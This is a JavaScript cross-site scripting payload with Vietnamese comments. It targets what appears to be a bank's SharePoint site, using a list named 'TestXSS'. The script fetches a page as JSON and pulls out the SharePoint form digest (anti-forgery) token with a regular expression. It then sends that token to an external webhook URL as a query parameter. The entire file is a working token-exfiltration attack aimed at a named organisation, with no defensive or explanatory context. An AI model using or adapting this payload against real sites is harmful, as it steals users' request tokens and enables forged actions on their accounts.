const DIGEST_API_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/Lists/TestXSS/AllItems.aspx';
const WEBHOOK_URL = 'https://webhook-test.com/fc090c2a4b9b8347c2761f9e3944e4bc';

function sendToWebhook(digestValue) {
    const webhookReq = new XMLHttpRequest();
    const finalWebhookUrl = WEBHOOK_URL + '?digest=' + encodeURIComponent(digestValue);
    
    // Yêu cầu GET đến webhook
    webhookReq.open('get', finalWebhookUrl, true); 
    webhookReq.send();
}

function handleResponse() {
    let digestValue = null;
    
    try {
        // *** 1. Regex để tìm và trích xuất giá trị _SPOFormDigestValue ***
        // Pattern: "_SPOFormDigestValue":"(CHUỖI_TOKEN)"
        const regex = /"_SPOFormDigestValue":"([^"]+)"/i;
        const match = this.responseText.match(regex);
        
        if (match && match[1]) {
            digestValue = match[1];
        } else {
             // Thử Regex cho trường hợp response là JSON cũ (hình 1)
             const oldRegex = /"FormDigestValue":"([^"]+)"/i;
             const oldMatch = this.responseText.match(oldRegex);
             if (oldMatch && oldMatch[1]) {
                 digestValue = oldMatch[1];
             }
        }
        
    } catch (e) {
        return; 
    }
    
    if (digestValue) {
        // 2. Gửi token đã trích xuất tới Webhook
        sendToWebhook(digestValue);
    }
}

// Bắt đầu quá trình
const digestReq = new XMLHttpRequest();
digestReq.onload = handleResponse;

digestReq.open('get', DIGEST_API_URL, true); 
// Giữ lại header này vì nó kích hoạt JSON response
digestReq.setRequestHeader('Accept', 'application/json;odata=verbose'); 
digestReq.send();
